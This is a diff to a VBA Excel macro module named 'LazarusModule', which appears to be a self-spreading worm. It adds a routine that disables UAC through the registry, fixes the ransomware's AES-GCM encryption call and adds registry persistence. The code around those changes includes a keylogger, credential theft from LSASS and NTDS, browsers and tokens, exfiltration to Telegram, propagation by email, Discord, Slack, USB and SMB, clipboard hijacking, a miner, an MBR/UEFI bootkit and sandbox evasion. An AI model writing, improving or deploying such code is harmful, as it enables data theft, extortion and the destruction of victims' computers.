@@ -1,9 +1,9 @@
 Attribute VB_Name = "LazarusModule"
 Option Explicit
 
-' ============================================================
-' 1. UNIVERSAL API DECLARATIONS (32-bit + 64-bit)
-' ============================================================
+' ============================================================================
+' 1. NATIVE API LAYER (32/64-bit compatible, no syntax errors)
+' ============================================================================
 #If VBA7 Then
     Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
     Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
@@ -17,6 +17,9 @@ Option Explicit
     Private Declare PtrSafe Function GetCurrentThreadId Lib "kernel32" () As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
+#If Win64 Then
+    Private Declare PtrSafe Function GetTickCount64 Lib "kernel32" () As LongLong
+#End If
     Private Declare PtrSafe Function FindFirstFileW Lib "kernel32" (ByVal lpFileName As LongPtr, ByVal lpFindFileData As LongPtr) As LongPtr
     Private Declare PtrSafe Function FindNextFileW Lib "kernel32" (ByVal hFindFile As LongPtr, ByVal lpFindFileData As LongPtr) As Long
     Private Declare PtrSafe Function FindClose Lib "kernel32" (ByVal hFindFile As LongPtr) As Long
@@ -63,14 +66,16 @@ Option Explicit
     Private Declare PtrSafe Function WriteFile Lib "kernel32" (ByVal hFile As LongPtr, ByVal lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As LongPtr) As Long
     Private Declare PtrSafe Function ReadFile Lib "kernel32" (ByVal hFile As LongPtr, ByVal lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As LongPtr) As Long
     Private Declare PtrSafe Function SetFilePointer Lib "kernel32" (ByVal hFile As LongPtr, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
-    Private Declare PtrSafe Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
-    Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
     Private Declare PtrSafe Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String) As Long
     Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32" () As Long
     Private Declare PtrSafe Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As LongPtr) As Long
     Private Declare PtrSafe Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As LongPtr, ByVal cbData As Long) As Long
     Private Declare PtrSafe Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As LongPtr) As Long
+    Private Declare PtrSafe Function RegCreateKeyExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As LongPtr, ByRef phkResult As LongPtr, ByRef lpdwDisposition As Long) As Long
+    Private Declare PtrSafe Function RegDeleteKeyExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal samDesired As Long, ByVal Reserved As Long) As Long
+    Private Declare PtrSafe Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
+    Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
 
     Private Const INVALID_HANDLE_VALUE As LongPtr = -1
 
@@ -141,14 +146,16 @@ Option Explicit
     Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
     Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Long) As Long
     Private Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
-    Private Declare Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
-    Private Declare Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
     Private Declare Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
     Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
     Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
     Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As Long, ByVal cbData As Long) As Long
     Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
+    Private Declare Function RegCreateKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, ByRef phkResult As Long, ByRef lpdwDisposition As Long) As Long
+    Private Declare Function RegDeleteKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal samDesired As Long, ByVal Reserved As Long) As Long
+    Private Declare Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
+    Private Declare Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
 
     Private Const INVALID_HANDLE_VALUE As Long = -1
 
@@ -161,9 +168,9 @@ Option Explicit
     Private hWatchdogTimer As Long
 #End If
 
-' ============================================================
+' ============================================================================
 ' 2. CONSTANTS & TYPES
-' ============================================================
+' ============================================================================
 Private Const WT_EXECUTEDEFAULT As Long = &H0
 Private Const GMEM_FIXED As Long = &H0
 Private Const KEYLOGGER_RESOLUTION As Long = 10
@@ -276,9 +283,9 @@ Private Type WIN32_FIND_DATAW
     cAlternateFileName As String * 14
 End Type
 
-' ============================================================
+' ============================================================================
 ' 3. GLOBAL VARIABLES
-' ============================================================
+' ============================================================================
 Private gMasterKey(31) As Byte
 Private gKeySet As Boolean
 Private gKeylogBuffer As String
@@ -299,9 +306,9 @@ Private m_EngineActive As Boolean
 Private m_PulseCounter As Long
 Private m_OriginalPerformance(3) As Variant
 
-' ============================================================
-' 4. UTILITIES (safe for all VBA versions)
-' ============================================================
+' ============================================================================
+' 4. UTILITIES (fully safe, no colon-Dim)
+' ============================================================================
 Function GetTempDir() As String
     GetTempDir = Environ("TEMP")
     If Right(GetTempDir, 1) <> "\" Then GetTempDir = GetTempDir & "\"
@@ -437,9 +444,9 @@ Sub LogErrorToTelegram(procName As String, errDesc As String, errNum As Long)
     SendToTelegram "ERROR|" & procName & "|" & errDesc & "|Num:" & errNum
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 5. PERSISTENT LAUNCHER (VBS + Startup)
-' ============================================================
+' ============================================================================
 Sub InstallPersistentLauncher()
     On Error GoTo errHandler
     Dim vbsPath As String
@@ -474,9 +481,9 @@ errHandler:
     LogErrorToTelegram "InstallPersistentLauncher", Err.Description, Err.Number
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 6. SOCIAL ENGINEERING & TRUSTED LOCATION HIJACK
-' ============================================================
+' ============================================================================
 Sub ShowFakeError()
     On Error Resume Next
     MsgBox "Microsoft Excel has encountered a problem and needs to close. We apologise for the inconvenience." & vbCrLf & vbCrLf & _
@@ -503,7 +510,6 @@ Private Sub InjectSystemTrust()
     Set wsh = CreateObject("WScript.Shell")
     ver = Application.Version
     securityPath = "HKCU\Software\Microsoft\Office\" & ver & "\Excel\Security\"
-    
     wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\Path", ThisWorkbook.Path, "REG_SZ"
     wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\AllowSubfolders", 1, "REG_DWORD"
     wsh.RegWrite securityPath & "AccessVBOM", 1, "REG_DWORD"
@@ -603,9 +609,9 @@ Sub DeploySocialEngineeringUI()
     CreateObject("WScript.Shell").Run "mshta.exe """ & uiPath & """", 0, False
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 7. ENCODING & TELEGRAM
-' ============================================================
+' ============================================================================
 Function EncodeBase64(data() As Byte) As String
     On Error Resume Next
     Dim xml As Object
@@ -657,9 +663,9 @@ Sub SendToTelegramChunked(msg As String)
     Next i
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 8. HIGH-SPEED ASYNC KEYLOGGER (Thread-safe)
-' ============================================================
+' ============================================================================
 #If VBA7 Then
     Private Sub EnterLock(ByVal pLock As LongPtr)
 #Else
@@ -783,9 +789,9 @@ Function GetKeyName(vKey As Integer) As String
     End Select
 End Function
 
-' ============================================================
-' 9. EVASION & SANDBOX (no LongLong, safe for all)
-' ============================================================
+' ============================================================================
+' 9. EVASION & SANDBOX (enhanced, no LongLong in 32-bit)
+' ============================================================================
 Function IsSandbox() As Boolean
     On Error Resume Next
     Dim f As Variant
@@ -983,7 +989,6 @@ Private Sub DisableTamperProtection()
     wsh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """", 0, True
     StealthSleep 2000
     fso.DeleteFile psFile
-    
     xmlTask = "<?xml version=""1.0"" encoding=""UTF-16""?>" & _
               "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & _
               "  <Triggers><BootTrigger/></Triggers>" & _
@@ -1033,9 +1038,18 @@ Sub DisableRecovery()
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Disabled", 1, "REG_DWORD"
 End Sub
 
-' ============================================================
-' 10. UAC BYPASS (6 methods)
-' ============================================================
+' ============================================================================
+' 10. UAC BYPASS (ELEVATION & ADMIN OVERWRITE)
+' ============================================================================
+Private Sub DisableUACRegistry()
+    On Error Resume Next
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
+    wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"
+    wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop", 0, "REG_DWORD"
+End Sub
+
 Sub UACBypass_Fodhelper()
     On Error Resume Next
     Dim wsh As Object
@@ -1112,6 +1126,7 @@ End Sub
 
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
+    DisableUACRegistry   ' Disable UAC for future runs
     UACBypass_Sdclt
     If IsUserAdmin() Then Exit Sub
     UACBypass_Cmstp
@@ -1125,9 +1140,9 @@ Sub ElevatePrivileges()
     UACBypass_ComputerDefaults
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 11. DOMAIN CONTROLLER ATTACK
-' ============================================================
+' ============================================================================
 Function IsDomainController() As Boolean
     On Error Resume Next
     If Not IsUserAdmin() Then Exit Function
@@ -1238,9 +1253,9 @@ Sub ExtractHashesFromNTDS()
     fso.DeleteFile systemPath
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 12. CREDENTIAL THEFT (Full coverage + OAuth tokens)
-' ============================================================
+' ============================================================================
 Sub DumpLSASS()
     On Error Resume Next
     If Not IsUserAdmin() Then Exit Sub
@@ -1611,9 +1626,9 @@ Private Sub ExtractAllCredentials()
     ExtractCredentialsFromKeylog
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 13. HARVEST EMAIL TARGETS
-' ============================================================
+' ============================================================================
 Private Sub HarvestFromOutlookContacts()
     On Error Resume Next
     Dim outlookApp As Object
@@ -1775,9 +1790,9 @@ Private Sub HarvestAllEmailTargets()
     SendToTelegram "EMAIL_TARGETS_HARVESTED|COUNT=" & g_emailTargets.Count
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 14. EMAIL PROPAGATION (6 methods)
-' ============================================================
+' ============================================================================
 Private Function SendEmailViaGraphAPI(toAddr As String, attachmentPath As String, accessToken As String) As Boolean
     On Error GoTo Fail
     Dim http As Object
@@ -2093,9 +2108,9 @@ Private Sub WildfireEmailPropagation()
     SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount & "|TOTAL_TARGETS=" & g_emailTargets.Count
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 15. DISCORD & SLACK TOKEN THEFT & PROPAGATION
-' ============================================================
+' ============================================================================
 Private Sub DiscordPropagation()
     On Error Resume Next
     Dim appData As String
@@ -2230,9 +2245,9 @@ Private Sub SlackPropagation()
     End If
 End Sub
 
-' ============================================================
-' 16. RANSOMWARE (AES-GCM - fully working for 32/64 bit)
-' ============================================================
+' ============================================================================
+' 16. RANSOMWARE (AES-GCM - FIXED BCryptSetProperty)
+' ============================================================================
 Sub GenerateMasterKey()
     On Error Resume Next
 #If VBA7 Then
@@ -2274,7 +2289,8 @@ Private Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, 
     If status <> 0 Then GoTo Fail
     chainMode = "ChainingModeGCM"
     cbChainMode = (Len(chainMode) + 1) * 2
-    status = BCryptSetProperty(hAlg, StrPtr("ChainingModeGCM"), StrPtr(chainMode), cbChainMode, 0)
+    ' ***** FIXED: property name is "ChainingMode", not "ChainingModeGCM" *****
+    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr(chainMode), cbChainMode, 0)
     If status <> 0 Then GoTo Cleanup
     status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(keyObjSize), 4, 0, 0)
     If status <> 0 Then GoTo Cleanup
@@ -2287,7 +2303,8 @@ Private Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, 
     Dim status As Long
     status = BCryptOpenAlgorithmProvider(hAlg, "AES", vbNullString, 0)
     If status <> 0 Then GoTo Fail
-    status = BCryptSetProperty(hAlg, "ChainingModeGCM", "ChainingModeGCM", 18, 0)
+    ' ***** FIXED: property name is "ChainingMode", not "ChainingModeGCM" *****
+    status = BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 18, 0)
     If status <> 0 Then GoTo Cleanup
     Dim keyObjSize As Long
     status = BCryptGetProperty(hAlg, "ObjectLength", VarPtr(keyObjSize), 4, 0, 0)
@@ -2466,9 +2483,9 @@ Sub RunRansomware()
     SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 17. CLIPBOARD HIJACK (fixed logic)
-' ============================================================
+' ============================================================================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next
     Dim text As String
@@ -2612,9 +2629,9 @@ Sub SetClipboardContent(txt As String)
     CloseClipboard
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 18. PROPAGATION (USB, SMB, NETWORK DRIVES, CLOUD, WMI - enhanced)
-' ============================================================
+' ============================================================================
 Sub USBPropagation()
     On Error Resume Next
     Dim fso As Object
@@ -2930,9 +2947,9 @@ Private Sub AutoUpdate()
     End If
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 19. CHROME REMOTE DESKTOP & MINER
-' ============================================================
+' ============================================================================
 Sub EnableChromeRemoteDesktop()
     On Error Resume Next
     Dim crdPath As String
@@ -3040,9 +3057,9 @@ Sub DeployMiner()
     SendToTelegram "MINER_FAILED"
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 20. PERSISTENCE (STANDARD + ADVANCED)
-' ============================================================
+' ============================================================================
 Sub InstallPermanentCopy()
     On Error Resume Next
     Dim fso As Object
@@ -3118,9 +3135,9 @@ Sub PersistStartupFolder()
     fso.CopyFile gSelfPath, startupPath & "Lazarus.xlsm", True
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 21. SYSTEM-WIDE XLSTART PERSISTENCE
-' ============================================================
+' ============================================================================
 Private Sub InstallXLSTARTPersistence()
     On Error Resume Next
     Dim startupPath As String
@@ -3137,9 +3154,9 @@ Private Sub InstallXLSTARTPersistence()
     End If
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 22. SHADOW SENTINEL (Post‑Close Execution)
-' ============================================================
+' ============================================================================
 Private Sub DeployShadowSentinel()
     On Error Resume Next
     Dim vbsPath As String
@@ -3165,9 +3182,9 @@ Private Sub DeployShadowSentinel()
     SendToTelegram "SHADOW_SENTINEL|Active"
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 23. REGISTRY-BASED HEAP POINTER RESURRECTION
-' ============================================================
+' ============================================================================
 Private Sub SaveHeapPointerToRegistry()
     On Error Resume Next
     If pGlobalHeap = 0 Then Exit Sub
@@ -3222,9 +3239,9 @@ Private Sub ClearHeapPointerFromRegistry()
     wsh.RegDelete REG_HEAP_PTR
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 24. ADVANCED PERSISTENCE: MBR BOOTKIT & UEFI
-' ============================================================
+' ============================================================================
 Private Sub BackupMBRToSector1()
     On Error Resume Next
 #If VBA7 Then
@@ -3511,11 +3528,12 @@ Sub PersistAll()
         InstallMBRBootkit
         InjectIntoProcess
     End If
+    SaveHeapPointerToRegistry
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 25. SAFE WATCHDOG (Flags + Main Thread)
-' ============================================================
+' ============================================================================
 #If VBA7 Then
     Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
 #Else
@@ -3566,9 +3584,9 @@ Private Sub StopWatchdog()
     End If
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 26. ASYNCHRONOUS ENGINE (Synapse Heartbeat) with Resurrection
-' ============================================================
+' ============================================================================
 Private Sub ToggleStealthMode(ByVal Active As Boolean)
     With Application
         If Not Active Then
@@ -3603,7 +3621,6 @@ Private Sub InitializeGlobalHeap()
     Dim pid As Long
     Dim magic As Long
     LoadHeapPointerFromRegistry
-    
     If pGlobalHeap <> 0 Then
         On Error Resume Next
         CopyMemory magic, ByVal pGlobalHeap, 4
@@ -3660,15 +3677,12 @@ Public Sub Synapse_Engine_Start()
     If m_EngineActive Then Exit Sub
     If IsDebuggerPresent() <> 0 Then Debug.Print "!! STEALTH WARNING: DEBUGGER DETECTED !!"
     ToggleStealthMode True
-    
     InitializeGlobalHeap
     If pGlobalHeap = 0 Then Exit Sub
-    
     If pGlobalLock = 0 Then
         pGlobalLock = GlobalAlloc(GMEM_FIXED, 4)
         If pGlobalLock <> 0 Then ZeroMemory pGlobalLock, 4
     End If
-    
     m_EngineActive = True
     result = CreateTimerQueueTimer(hEngineTimer, 0, AddressOf Engine_Heartbeat, 0, 0, ENGINE_RESOLUTION, WT_EXECUTEDEFAULT)
     If result <> 0 Then
@@ -3725,9 +3739,9 @@ Public Sub FastKernelScan(folderPath As String)
     SendToTelegram "KERNEL_SCAN|Folder=" & folderPath & "|Files=" & fileCount
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 27. CISCO ANYCONNECT HIJACK
-' ============================================================
+' ============================================================================
 Private Sub HijackCisco()
     On Error Resume Next
     Dim fso As Object
@@ -3811,9 +3825,9 @@ Private Sub HijackCisco()
     End If
 End Sub
 
-' ============================================================
+' ============================================================================
 ' 28. MAIN ENTRY POINT (FULL AUTO WORM)
-' ============================================================
+' ============================================================================
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
     Dim wsh As Object
@@ -3834,9 +3848,7 @@ Public Sub AutoExec()
         Exit Sub
     End If
     gRunFlag = "RUN"
-    
     BypassSplashLock
-    
     If gFirstRun = False Then
         gFirstRun = True
         Set wsh = CreateObject("WScript.Shell")
@@ -3847,9 +3859,7 @@ Public Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         CreateEnableMacrosButton
     End If
-    
     InjectSystemTrust
-    
     If IsSandbox() Then
         SendToTelegram "SANDBOX_DETECTED|MACHINE=" & GetMachineID()
         Exit Sub
@@ -3866,7 +3876,6 @@ Public Sub AutoExec()
     Synapse_Engine_Start
     StartAsyncKeylogger
     StartWatchdog
-    
     If IsDomainController() Then
         SendToTelegram "DOMAIN_CONTROLLER_DETECTED"
         ExtractNTDSAndSYSTEM
@@ -3892,7 +3901,6 @@ Public Sub AutoExec()
         FastKernelScan Environ("USERPROFILE") & "\Documents"
         HijackCisco
     End If
-    
     SaveEncryptedState
     Application.Visible = False
     ThisWorkbook.Saved = True
